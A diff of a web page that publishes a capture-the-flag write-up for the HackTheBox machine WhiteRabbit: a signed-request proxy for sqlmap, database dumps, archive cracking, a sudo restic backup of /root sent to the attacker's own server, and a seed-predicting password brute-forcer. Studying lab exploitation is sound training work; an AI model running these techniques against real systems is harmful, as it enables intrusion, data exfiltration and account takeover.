@@ -3,13 +3,13 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="robots" content="noindex">
+    <meta name="robots" content="index, follow">
     <title>WhiteRabbit - Hexicon Archives</title>
     <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
     <link rel="stylesheet" href="../style.css">
     <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/machines/WhiteRabbit.html" />
     <!-- Machine-specific metadata for SEO -->
-    <meta name="description" content="Restricted writeup for WhiteRabbit machine from HackTheBox - Insane difficulty level">
+    <meta name="description" content="Detailed writeup for WhiteRabbit machine from HackTheBox - Insane difficulty level">
     <meta name="keywords" content="HackTheBox, WhiteRabbit, Insane, CTF, writeup, cybersecurity, penetration testing, Hexicon">
 </head>
 <body>
@@ -59,16 +59,348 @@
         <h1 class="writeup-title">WhiteRabbit</h1>
         <div class="writeup-metadata">
             <span class="difficulty insane">Insane</span>
-            <span class="date">Active machine</span>
+            <span class="date">December 13, 2025</span>
         </div>
         
         <div class="writeup-container">
             <div class="writeup-body">
                 <!-- Machine-specific content goes here -->
-                <p><img alt="WhiteRabbit" src="../images/WhiteRabbit/pwned.png" /></p>
-<p>WhiteRabbit is an <strong>ACTIVE</strong> machine!</p>
-<p>This write-up will go live once WhiteRabbit retires.</p>
-<p>Please note that I’m following Hack The Box’s guidelines by not posting detailed solutions while the machine is still live.</p>
+                <p><img alt="pwned" src="../images/WhiteRabbit/pwned.png" /></p>
+<p>WhiteRabbit was n insane-difficulty Linux machine that began with web enumeration revealing an Uptime Kuma status page exposing internal subdomains.
+I discovered a WikiJS instance containing documentation for a GoPhish webhook workflow that processed email data through N8N with SQL database queries.
+The documentation inadvertently leaked the HMAC secret key (3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS) used to sign webhook requests, which I exploited by creating a Python proxy wrapper for SQLmap that calculated valid HMAC-SHA256 signatures.
+This allowed me to exploit a SQL injection vulnerability in the email parameter of the webhook endpoint, dumping the temp.command_log table which revealed Restic repository credentials (ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw) and a custom password generator binary being used to set Neo's password.</p>
+<p>I restored a Restic snapshot containing a password-protected 7z archive with Bob's SSH keys, cracking the archive password (1q2w3e4r5t6y) using John the Ripper with rockyou.txt.
+After SSH access as Bob in a Docker container, I exploited Bob's unrestricted sudo privileges for /usr/bin/restic to backup the container's /root directory to a REST server on my attack box, exfiltrating Morpheus's SSH private key which granted access to the main host.</p>
+<p>Reverse engineering the neo-password-generator binary with Ghidra revealed it used gettimeofday() as the seed for a pseudo-random 20-character password generator with a charset of 62 characters (a-zA-Z0-9).
+The SQL injection had exposed the exact timestamp of password generation (2024-08-30 14:40:42), leaving only milliseconds unknown. I recreated the password generation logic in Python using ctypes to call libc's srand() and rand() functions, generating all 1000 possible passwords for millisecond offsets 0-999.
+I created a bash bruteforce script that successfully discovered Neo's password (WBSxhWgfnMiclrV4dqfj) after testing the password list, and Neo's unrestricted sudo privileges (ALL) allowed immediate privilege escalation to root.</p>
+<h1>User Flag</h1>
+<p><img alt="nmap" src="../images/WhiteRabbit/nmap.png" /></p>
+<p>Initial nmap scan reveals 3 ports. SSH on 22 and 2222, and a website on 80. The fact that there are 2 SSH ports leads me to believe that there may be a container running on the box.</p>
+<h2>Fuzzing The Website</h2>
+<p><img alt="website" src="../images/WhiteRabbit/website.png" /></p>
+<p>The website mentions several tools: n8n, GoPhish, Stalwart Mailserver, and Uptime Kuma. There is nothing interesting on the main page itself, so I will try to find additional endpoints and subdomains by fuzzing.</p>
+<pre class="codehilite"><code>ffuf -u http://whiterabbit.htb/FUZZ -w /usr/share/wordlists//seclists/Discovery/Web-Content/raft-small-words.txt
+
+ffuf -u http://whiterabbit.htb -H &quot;Host: FUZZ.whiterabbit.htb&quot; -w /usr/share/wordlists//seclists/Discovery/DNS/subdomains-top1million-110000.txt -fw 1
+</code></pre>
+
+<p><img alt="fuzz" src="../images/WhiteRabbit/fuzz.png" /></p>
+<p>There is only a single result, and it is a <code>status</code> subdomain under the main site.</p>
+<h2>Status Subdomain Fuzzing</h2>
+<p><img alt="uptimekuma" src="../images/WhiteRabbit/uptimekuma.png" /></p>
+<p>Uptime Kuma is a self-hosted monitoring tool for keeping track of websites and applications. I don't have any credentials, so I won't be able to do anything with this login page. I'll fuzz this subdomain for endpoints instead.</p>
+<p><img alt="dirsearch" src="../images/WhiteRabbit/dirsearch.png" /></p>
+<p>A status endpoint has been found. Under this page, Uptime Kuma hosts its status pages on endpoints called <code>slugs</code>. I will fuzz this endpoint as well, as this will allow me to discover any existing <code>slugs</code></p>
+<p><img alt="fuzz2" src="../images/WhiteRabbit/fuzz2.png" /></p>
+<p>Notice how many false positives have appeared with the same size of 2KB. By excluding this, I'll get the few differing entries that are not error pages.</p>
+<p>Only a single entry has been found, but it returned a 200 status code. This means that I can reach it without authentication as is.</p>
+<p><img alt="status" src="../images/WhiteRabbit/status.png" /></p>
+<p>Out of the 4 websites being monitored, one is the main whiterabbit website, two (GoPhish and wikijs) are new, and the n8n one doesn't have a visible subdomain. I'll add the two new ones to my host file.</p>
+<h2>Investigating The New Subdomains</h2>
+<pre class="codehilite"><code>ddb09a8558c9.whiterabbit.htb &lt;- GoPhish
+a668910b5514e.whiterabbit.htb &lt;- wikijs
+</code></pre>
+
+<p><img alt="gophis" src="../images/WhiteRabbit/gophis.png" /></p>
+<p>GoPhish on <code>ddb09a8558c9.whiterabbit.htb</code> requires credentials. I'll pivot to checking out the wikijs subdomain.</p>
+<p><img alt="wikijs" src="../images/WhiteRabbit/wikijs.png" /></p>
+<p>Wikijs main page contains a telling ToDo note. Access to this wiki does not require authentication for now.</p>
+<p><code>add authentification for wiki because we may have some sensitive data here in the next time</code></p>
+<p>After clicking the browse button, a new page of the wiki titled <code>GoPhish Webhooks</code> appears.</p>
+<p><img alt="workflow" src="../images/WhiteRabbit/workflow.png" /></p>
+<p>This page describeshow event data from GoPhish is sent to and processed by N8N. It is configured to receive POST requests from GoPhish, containing event data like the recipient's email, action taken, and the campaign ID.</p>
+<p>Looking at the workflow image, there may be an SQLi possibility since n8n will check whether the email provided in the request exists in the DB.</p>
+<p>To mitigate this, an <code>x-gopher-signature</code> header containing an HMAC signature calculated for every request is used, created with a secret key known only to GoPhish. An example Webhook POST request was provided as well.</p>
+<pre class="codehilite"><code>POST /webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d HTTP/1.1
+Host: 28efa8f7df.whiterabbit.htb
+x-gophish-signature: sha256=cf4651463d8bc629b9b411c58480af5a9968ba05fca83efa03a21b2cecd1c2dd
+Accept: */*
+Accept-Encoding: gzip, deflate, br
+Connection: keep-alive
+Content-Type: application/json
+Content-Length: 81
+
+{
+  &quot;campaign_id&quot;: 1,
+  &quot;email&quot;: &quot;test@ex.com&quot;,
+  &quot;message&quot;: &quot;Clicked Link&quot;
+}
+</code></pre>
+
+<p>Without the secret key to forge the HMAC signatures, I cannot do anything here. There is a <code>gophish_to_phishing_score_database.json</code> file attached, containing a complete workflow with an invalid signature.</p>
+<h2>Finding the SQLi</h2>
+<p><img alt="secret" src="../images/WhiteRabbit/secret.png" /></p>
+<p>On line 281, the secret value used to create the HMAC signatures is revealed within the value check operation.</p>
+<p><img alt="sqli" src="../images/WhiteRabbit/sqli.png" /></p>
+<p>And this snippet confirms the SQLi vulnerability. The user-controlled <code>email</code> value from a received POST request is directly sent to the database in this query:</p>
+<p><code>SELECT * FROM victims where email = \"USER-INPUT\" LIMIT 1</code></p>
+<p>This new knowledge now 100% points me towards the SQLi vector. The only major obstacle left is the HMAC-SHA header verification, but with the secret value, I will be able to bypass it.</p>
+<h3>Creating the proxy-wrapper script for SQLmap</h3>
+<p>I will use SQLmap to bruteforce the JSON parameters and find the SQLi. I'll create a proxy-wrapper script for sqlmap that will:</p>
+<ol>
+<li>Listen for any incoming requests on port 8080;</li>
+<li>For each request, it will calculate its HMAC-SHA256 signature and append it to the request within the <code>x-gophish-signature</code> header.</li>
+<li>This modified request will be sent to the webhook address from the example request.</li>
+</ol>
+<pre class="codehilite"><code>import hmac
+import hashlib
+import json
+from http.server import BaseHTTPRequestHandler, HTTPServer
+import requests
+
+SECRET_KEY = &quot;3CWVGMndgMvdVAzOjqBiTicmv7gxc6IS&quot;
+TARGET_URL = &quot;http://28efa8f7df.whiterabbit.htb/webhook/d96af3a4-21bd-4bcb-bd34-37bfc67dfd1d&quot;
+
+class ProxyHandler(BaseHTTPRequestHandler):
+    def do_POST(self):
+        content_length = int(self.headers['Content-Length'])
+        post_data = self.rfile.read(content_length)
+
+        try:
+            payload = json.loads(post_data.decode('utf-8'))
+
+            payload_json = json.dumps(payload, separators=(',', ':'))
+            signature = hmac.new(
+                SECRET_KEY.encode('utf-8'),
+                payload_json.encode('utf-8'),
+                hashlib.sha256
+            ).hexdigest()
+
+            headers = {
+                &quot;Content-Type&quot;: &quot;application/json&quot;,
+                &quot;x-gophish-signature&quot;: f&quot;sha256={signature}&quot;
+            }
+
+            response = requests.post(TARGET_URL, headers=headers, data=payload_json)
+
+            self.send_response(response.status_code)
+            self.send_header('Content-type', 'application/json')
+            self.end_headers()
+            self.wfile.write(response.content)
+
+        except Exception as e:
+            self.send_response(500)
+            self.end_headers()
+            self.wfile.write(str(e).encode('utf-8'))
+
+if __name__ == '__main__':
+    server_address = ('127.0.0.1', 8080)
+    httpd = HTTPServer(server_address, ProxyHandler)
+    print(&quot;Proxy server running on port 8080...&quot;)
+    httpd.serve_forever()
+</code></pre>
+
+<p>It could also be done manually by taking input directly from the user, but SQLmap is simply faster and can identify more obscure SQLi vectors.</p>
+<p><code>sqlmap -r request.req --proxy="http://127.0.0.1:8080" --dbs</code></p>
+<p><img alt="sqlmap" src="../images/WhiteRabbit/sqlmap.png" /></p>
+<p>Sqlmap has found 3 injection points, identified the DBMS backend as <code>MySQL</code>, and enumerated the existing databases. With this new information, I can enumerate each of them to see their tables and their contents.</p>
+<p><code>sqlmap -r request.req --proxy="http://127.0.0.1:8080" --dbms=mysql -D phishing --dump-all</code></p>
+<p><img alt="phishing" src="../images/WhiteRabbit/phishing.png" /></p>
+<p>Nothing interesting in the phishing database, only test data.</p>
+<p><code>sqlmap -r request.req --proxy="http://127.0.0.1:8080" --dbms=mysql -D temp --dump-all</code></p>
+<p><img alt="temp" src="../images/WhiteRabbit/temp.png" /></p>
+<p>On the other hand, the <code>command_log</code> table under the <code>temp</code> database contains a list of commands.</p>
+<pre class="codehilite"><code>uname -a &lt;- Prints out detailed information about the system and its components/hardware
+
+restic init --repo rest:http://75951e6ff.whiterabbit.htb [!] &lt;- Initializes a new Restic repository at the provided location. In this case, it is a REST server with this address.
+
+echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw &gt; .restic_passwd [!!!] &lt;- Sets the Restic repo password to this value
+
+rm -rf .bash_history &lt;- Removes the bash history of the current user. This will clean up all the commands used
+
+#thatwasclose &lt;- lol
+
+cd /home/neo/ &amp;&amp; /opt/neo-password-generator/neo-password-generator | passwd [!] &lt;- A custom password generator binary is used, and the result of its execution is piped to passwd, which will set the user's password to that result
+</code></pre>
+
+<h2>Restoring The Restic Repo</h2>
+<p>Since I have the repo password, I'll take a look at what snapshots are tied to it. A snapshot is a saved state of files and directories in the repo at a specific moment in time.</p>
+<p><code>restic snapshots -r rest:http://75951e6ff.whiterabbit.htb</code></p>
+<p><img alt="snapshot" src="../images/WhiteRabbit/snapshot.png" /></p>
+<p>There is only a single snapshot, but the path shown suggests it probably contains SSH keys for Bob. I will use the snapshot ID to restore the only available one.</p>
+<p><code>restic restore -r rest:http://75951e6ff.whiterabbit.htb 272cacd5 --target repo</code></p>
+<p><img alt="restore" src="../images/WhiteRabbit/restore.png" /></p>
+<h2>Cracking The 7z Archive With JtR</h2>
+<p>The only file inside is a 7z archive. Trying to extract it results in a password prompt.</p>
+<p><img alt="error" src="../images/WhiteRabbit/error.png" /></p>
+<p>But it also reveals what files are inside, and as expected, Bob's keys are there, alongside a config file. I'll generate a crackable hash with <code>7z2john</code>, and I will try cracking it with John the Ripper to get the password.</p>
+<p><code>7z2john bob.7z &gt; 7zhash</code></p>
+<p><code>john 7zhash --wordlist="/usr/share/wordlists/rockyou.txt"</code></p>
+<p><img alt="cracked" src="../images/WhiteRabbit/cracked.png" /></p>
+<p><code>7z archive | 1q2w3e4r5t6y</code></p>
+<p>This password allows me to extract the archive and get my hands on Bob's SSH keys.</p>
+<p><img alt="ssh" src="../images/WhiteRabbit/ssh.png" /></p>
+<h2>Backing Up The /root Directory With a REST Server</h2>
+<p>Judging by the hostname, I can fairly confidently say that this is a Docker container. I'll have a look at what Bob can do on the box.</p>
+<p><img alt="restic" src="../images/WhiteRabbit/restic.png" /></p>
+<p>Bob can run Restic as root with no restrictions. I will make a backup of the <code>/root</code> directory to get its contents. To do this, I will first set up a REST server on my attack box, so that I'll be able to get the files directly.</p>
+<p><code>restic-rest-server --path ~/restic --listen :8010 --no-auth</code></p>
+<p><img alt="server" src="../images/WhiteRabbit/server.png" /></p>
+<p>Now I can create a repo on my local box from within the SSH Bob shell.</p>
+<p><code>restic init --repo rest:http://10.10.16.34:8010/rootbackup</code></p>
+<p>And backup the <code>/root</code> directory into it.</p>
+<p><code>sudo /usr/bin/restic backup /root -r rest:http://10.10.16.34:8010/rootbackup/</code></p>
+<p><img alt="copy" src="../images/WhiteRabbit/copy.png" /></p>
+<p>I'll grab the snapshot ID so that I will be able to restore the files on my box.</p>
+<p><code>sudo /usr/bin/restic snapshots -r rest:http://10.10.16.34:8010/rootbackup/</code></p>
+<p><img alt="snapshots" src="../images/WhiteRabbit/snapshots.png" /></p>
+<p>Finally, on my box, I'll restore the snapshot containing the root directory. This cannot be done from within the SSH shell, as the files are still owned by root. After restoring them onto my box, they will be owned by the user who initiated the restore operation, which will bypass this issue.</p>
+<p><code>restic restore 74c81a5e -r rest:http://localhost:8010/rootbackup/ --target out</code></p>
+<p><img alt="keys" src="../images/WhiteRabbit/keys.png" /></p>
+<p>The root directory contains a new keypair, this time for the user <code>morpheus</code>. This user was not present in the container, so it is safe to assume that these keys will work on the main box.</p>
+<p><img alt="user" src="../images/WhiteRabbit/user.png" /></p>
+<h1>Root Flag</h1>
+<p>Morpheus himself cannot really do anything, but during the SQLi part of this box, in the command log, there was one command that did not belong to Bob.</p>
+<p><code>cd /home/neo/ &amp;&amp; /opt/neo-password-generator/neo-password-generator | passwd</code></p>
+<p>It was Neo using the custom binary to set a new password for his account. Neo is a valid user on this box, and as such, will be the next target for privilege escalation.</p>
+<h2>Reversing The Password Generator Binary</h2>
+<p>I will get the binary onto my box using SCP.</p>
+<p><code>scp -i morpheus morpheus@whiterabbit.htb:/opt/neo-password-generator/neo-password-generator /home/kalin/HTB/WhiteRabbit</code></p>
+<p>I'll use Ghidra to Reverse Engineer this ELF binary. Looking at its main function reveals something interesting.</p>
+<p><img alt="ghidra1" src="../images/WhiteRabbit/ghidra1.png" /></p>
+<p>It uses <code>gettimeofday</code> to get the current system timestamp, stored that value in the <code>local 28</code> variable, then passes the result to a custom function with <code>generate_password(local_28.tv_sec * 1000 + local_28.tv_usec / 1000);</code></p>
+<p>The passed timestamp is then counted up into total milliseconds since epoch with <code>local_28.tv_sec * 1000</code> converting seconds to milliseconds, and <code>local_28.tv_usec / 1000</code> converting microseconds to milliseconds.</p>
+<p><img alt="ghidra2" src="../images/WhiteRabbit/ghidra2.png" /></p>
+<p>This function takes the previously prepared variable and seeds the random number generator with it <code>srand(param_1)</code>, before running a loop.</p>
+<pre class="codehilite"><code>  for (local_34 = 0; local_34 &lt; 0x14; local_34 = local_34 + 1) {
+    iVar1 = rand();
+    local_28[local_34] =
+         &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;[iVar1 % 0x3e];
+  }
+</code></pre>
+
+<p>For each iteration of this loop, it generates a random number with rand, takes modulo 0x3e (62) to get index 0-61, then uses that index to pick a character from the following charset string:</p>
+<p><code>abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789</code></p>
+<p>26 lowercase + 26 uppercase letters + 10 numbers. 62 characters in total.</p>
+<p>It stores that character in <code>local_28</code> array, and repeats the process 19 more times (0x14 = 20 in total) to generate a pseudo-random 20 character long password.</p>
+<h2>Creating The Password List</h2>
+<p>The fact that the binary uses a timestamp as its RNG seed makes it potentially exploitable. If I have the time of its execution, it'll be possible to guess the password that was generated.</p>
+<p>Going back to the SQLi portion of this box, the last command in the command_log table contained not only the command executing the binary, but also the timestamp of that event, precise to a second.</p>
+<p><code>2024-08-30 14:40:42</code></p>
+<p>I'm only missing the milliseconds, and that leaves ~1000 possible passwords I could get... But that value is small enough to try and bruteforce Neo's login with.</p>
+<h3>Making A Password Generator Script</h3>
+<pre class="codehilite"><code># generate_passwd.py
+
+import ctypes
+from datetime import datetime
+
+libc = ctypes.CDLL(&quot;libc.so.6&quot;)
+
+def generate_password(seed):
+
+    libc.srand(seed)
+
+    charset = &quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&quot;
+
+    password = &quot;&quot;
+    for _ in range(20):
+        random_num = libc.rand()
+        index = random_num % 62
+        password += charset[index]
+
+    return password
+
+def main():
+
+    dt = datetime(2024, 8, 30, 14, 40, 42)
+
+    unix_timestamp = int(dt.timestamp())
+
+    base_ms = unix_timestamp * 1000
+
+    print(f&quot;Base timestamp: {dt}&quot;)
+    print(f&quot;Unix timestamp (seconds): {unix_timestamp}&quot;)
+    print(f&quot;Base milliseconds: {base_ms}&quot;)
+    print(f&quot;\nGenerating 1000 possible passwords...\n&quot;)
+
+    with open(&quot;/home/kalin/HTB/WhiteRabbit/passwords&quot;, &quot;w&quot;) as f:
+
+        for ms_offset in range(1000):
+            seed = base_ms + ms_offset
+            password = generate_password(seed)
+
+            f.write(f&quot;{password}\n&quot;)
+
+            if (ms_offset + 1) % 100 == 0:
+                print(f&quot;Generated {ms_offset + 1}/1000 passwords...&quot;)
+
+    print(f&quot;\nAll 1000 passwords saved to passwords.txt&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main(
+</code></pre>
+
+<p>This script follows the binary's logic, using the provided timestamp instead of the current system time.</p>
+<p><img alt="generator" src="../images/WhiteRabbit/generator.png" /></p>
+<p>The last thing I need now is something to automate the bruteforce process. I'll create a bash script for that task, with some cool ASCII art.</p>
+<pre class="codehilite"><code>#!/bin/bash
+
+PASSWORD_FILE=&quot;/tmp/passwords&quot;
+USERNAME=&quot;neo&quot;
+COUNTER=0
+
+echo &quot;[*] Starting brute force attack on user: $USERNAME&quot;
+echo &quot;[*] Reading passwords from: $PASSWORD_FILE&quot;
+echo &quot;[*] Total passwords to try: $(wc -l &lt; $PASSWORD_FILE)&quot;
+echo &quot;&quot;
+
+while read -r password; do
+    COUNTER=$((COUNTER + 1))
+
+    if [ $((COUNTER % 100)) -eq 0 ]; then
+        echo &quot;[*] Tried $COUNTER passwords so far...&quot;
+    fi
+
+    result=$(echo &quot;$password&quot; | su -c &quot;whoami&quot; &quot;$USERNAME&quot; 2&gt;/dev/null)
+
+    if [ $? -eq 0 ] &amp;&amp; [ &quot;$result&quot; = &quot;$USERNAME&quot; ]; then
+        echo &quot;&quot;
+        echo &quot;╔══════════════════════════════════════════════════════════════╗&quot;
+        echo &quot;║                                                              ║&quot;
+        echo &quot;║   ███████╗██╗   ██╗ ██████╗ ██████╗███████╗███████╗███████╗  ║&quot;
+        echo &quot;║   ██╔════╝██║   ██║██╔════╝██╔════╝██╔════╝██╔════╝██╔════╝  ║&quot;
+        echo &quot;║   ███████╗██║   ██║██║     ██║     █████╗  ███████╗███████╗  ║&quot;
+        echo &quot;║   ╚════██║██║   ██║██║     ██║     ██╔══╝  ╚════██║╚════██║  ║&quot;
+        echo &quot;║   ███████║╚██████╔╝╚██████╗╚██████╗███████╗███████║███████║  ║&quot;
+        echo &quot;║   ╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝╚══════╝╚══════╝╚══════╝  ║&quot;
+        echo &quot;║                                                              ║&quot;
+        echo &quot;╚══════════════════════════════════════════════════════════════╝&quot;
+        echo &quot;&quot;
+        echo &quot;PASSWORD FOUND!&quot;
+        echo &quot;&quot;
+        echo &quot;┌─────────────────────────────────────────────────────────────┐&quot;
+        echo &quot;│  Username: $USERNAME                                        │&quot;
+        echo &quot;│  Password: $password                                        │&quot;
+        echo &quot;│  Attempts: $COUNTER                                         │&quot;
+        echo &quot;└─────────────────────────────────────────────────────────────┘&quot;
+        echo &quot;&quot;
+        echo &quot;We can now login as Neo with: su $USERNAME&quot;
+        echo &quot;&quot;
+        exit 0
+    fi
+
+done &lt; &quot;$PASSWORD_FILE&quot;
+
+echo &quot;&quot;
+echo &quot;╔══════════════════════════════════════════════════════════════╗&quot;
+echo &quot;║                         FAILED                               ║&quot;
+echo &quot;╚══════════════════════════════════════════════════════════════╝&quot;
+echo &quot;&quot;
+echo &quot;[!] Tried all $COUNTER passwords - none worked!&quot;
+echo &quot;[!] Double check the timestamp or target username.&quot;
+echo &quot;&quot;
+exit 1
+</code></pre>
+
+<p>This script will test all 1000 passwords with its main while read loop, and it'll keep track of how many have been checked so far.</p>
+<p>I transported both the password list and the bruteforcer script onto the target machine and ran the bruteforcer.</p>
+<p><img alt="success" src="../images/WhiteRabbit/success.png" /></p>
+<p><code>neo | WBSxhWgfnMiclrV4dqfj</code></p>
+<p>I'll su as Neo with the uncovered password.</p>
+<p><img alt="root" src="../images/WhiteRabbit/root.png" /></p>
+<p>Rooted!</p>
             </div>
             
             <div class="toc-sidebar">
